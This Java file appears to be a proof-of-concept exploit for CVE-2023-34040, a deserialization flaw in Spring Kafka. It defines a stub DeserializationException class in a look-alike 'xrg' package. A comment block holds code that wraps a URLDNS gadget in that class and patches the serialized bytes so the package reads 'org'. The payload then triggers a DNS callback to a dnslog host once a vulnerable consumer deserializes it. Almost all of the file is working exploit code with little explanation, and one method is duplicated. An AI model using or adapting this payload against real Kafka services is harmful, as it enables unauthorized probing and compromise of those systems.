package xrg.springframework.kafka.support.serializer;
import java.io.Serializable;

/*
CVE-2023-34040 Spring Kafka Deserialization Remote Code Execution

public static Object getURLDNS(final String url) throws Exception {
        URLStreamHandler handler = new SilentURLStreamHandler();
        HashMap<URL,String> hashMap = new HashMap<URL,String>();
        URL u = new URL(null, url, handler);
        hashMap.put(u, url);
        Field hashcode = u.getClass().getDeclaredField("hashCode");
        hashcode.setAccessible(true);
        hashcode.set(u,-1);
        return hashMap;
    }
    static class SilentURLStreamHandler extends URLStreamHandler {
        protected URLConnection openConnection(URL u) throws IOException {
            return null;
        }
        protected synchronized InetAddress getHostAddress(URL u) {
            return null;
        }
    }
    public static byte[] serialize(final Object obj) throws Exception {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream  objectOutputStream= new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(obj);
        return byteArrayOutputStream.toByteArray();
    }
public static Object getURLDNS(final String url) throws Exception {
        URLStreamHandler handler = new SilentURLStreamHandler();
        HashMap<URL,String> hashMap = new HashMap<URL,String>();
        URL u = new URL(null, url, handler);
        hashMap.put(u, url);
        Field hashcode = u.getClass().getDeclaredField("hashCode");
        hashcode.setAccessible(true);
        hashcode.set(u,-1);
        return hashMap;
    }
 public static byte[] getPOC() throws Exception {
        Object urldns = getURLDNS("http://leixiao.cff03fad.dnslog.store");
        Object o =new xrg.springframework.kafka.support.serializer.DeserializationException(urldns);
        byte[] data = serialize(o);
        data[8] = "o".getBytes()[0];
        return data;
    }
*/
public class DeserializationException implements Serializable {
    private static final long serialVersionUID = 8280022391259546509L;
    private Object foo;
    public DeserializationException(Object foo) {
        this.foo = foo;
    }
    public DeserializationException() {
        
    }
}
